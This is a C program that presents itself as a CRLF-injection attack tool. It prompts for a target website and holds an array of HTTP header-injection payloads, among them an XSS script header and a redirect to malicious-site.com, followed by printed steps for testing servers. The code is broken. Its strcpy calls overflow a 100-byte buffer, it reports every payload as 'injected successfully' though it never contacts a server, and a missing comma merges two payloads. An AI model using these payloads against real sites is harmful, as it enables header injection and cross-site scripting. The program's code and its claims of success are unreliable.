#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// ANSI color escape codes
#define COLOR_RED     "\x1b[31m"
#define COLOR_GREEN   "\x1b[32m"
#define COLOR_RESET   "\x1b[0m"

// Function to perform CRLF injection
void perform_injection(char *input) {
    // Find the end of the input string
    char *end = strchr(input, '\0');
    
    // Array of CRLF injection payloads
    char *payloads[] = {
        "\r\nInjectedHeader: malicious\r\n\r\n",
        "\r\nXSS-Payload: <script>alert('XSS')</script>\r\n\r\n",
        "\r\nLocation: https://malicious-site.com\r\n\r\n",
        "\r\nETag: \"\r\n\r\n",
        "\r\nContent-Type: text/html\r\n\r\n",
        "\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n\r\n"
        "\r\nSet-Cookie: sessionid=123456; Path=/; Expires=Wed, 09 Jun 2021 10:18:14 GMT\r\n\r\n",
        "\r\nAccess-Control-Allow-Origin: *\r\n\r\n",
        "\r\nConnection: keep-alive\r\n\r\n",
        "\r\nExpires: Thu, 01 Dec 1994 16:00:00 GMT\r\n\r\n",
        "\r\nServer: Custom/1.0\r\n\r\n",
        "\r\nStrict-Transport-Security: max-age=31536000\r\n\r\n",
        "\r\nX-Frame-Options: deny\r\n\r\n",
        "\r\nContent-Security-Policy: default-src 'self'\r\n\r\n",
        "\r\nReferrer-Policy: no-referrer\r\n\r\n",
        "\r\nX-Content-Type-Options: nosniff\r\n\r\n",
        "\r\nCache-Control: no-store, no-cache, must-revalidate\r\n\r\n",
        "\r\nPragma: no-cache\r\n\r\n",
        "\r\nContent-Length: 123\r\n\r\n",
        "\r\nX-Powered-By: PHP/7.4.3\r\n\r\n",
        "\r\nAllow: GET, POST, HEAD\r\n\r\n",
        "\r\nAccept-Ranges: bytes\r\n\r\n",
        "\r\nLast-Modified: Wed, 09 Jun 2021 10:18:14 GMT\r\n\r\n",
        "\r\nVary: Accept-Encoding\r\n\r\n",
        "\r\nX-Cache: HIT\r\n\r\n",
        "\r\nVia: 1.1 varnish\r\n\r\n",
        "\r\nAge: 1523\r\n\r\n",
        "\r\nX-Forwarded-For: 192.168.1.1\r\n\r\n",
        "\r\nDNT: 1\r\n\r\n"
    };

    // Iterate over each payload and attempt injection
    for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
        // Attempt to inject the payload
        if (strcpy(end, payloads[i]) == NULL) {
            printf("%sPayload %d failed to inject.%s\n", COLOR_RED, i + 1, COLOR_RESET);
        } else {
            printf("%sPayload %d injected successfully:%s\n%s%s%s\n", COLOR_GREEN, i + 1, COLOR_RESET, COLOR_GREEN, input, COLOR_RESET);
        }
    }

    // Final confirmation about the vulnerability and how to test it
    printf("\nConfirmation:\n");
    printf("The provided input has been manipulated with CRLF injection.\n");
    printf("This can be a security vulnerability in web applications,\n");
    printf("as it could potentially allow an attacker to inject arbitrary HTTP headers.\n\n");
    printf("To test the vulnerability:\n");
    printf("1. Send the manipulated input to a web server that echoes back HTTP headers.\n");
    printf("2. Check if the injected headers are reflected in the response.\n");
    printf("If the injected headers are present in the response, the vulnerability is confirmed.\n");
}

int main() {
    char input[100];

    // Prompt user for target website link
    printf("Enter your target website link: ");
    fgets(input, sizeof(input), stdin);

    // Perform CRLF injection
    perform_injection(input);

    return 0;
}
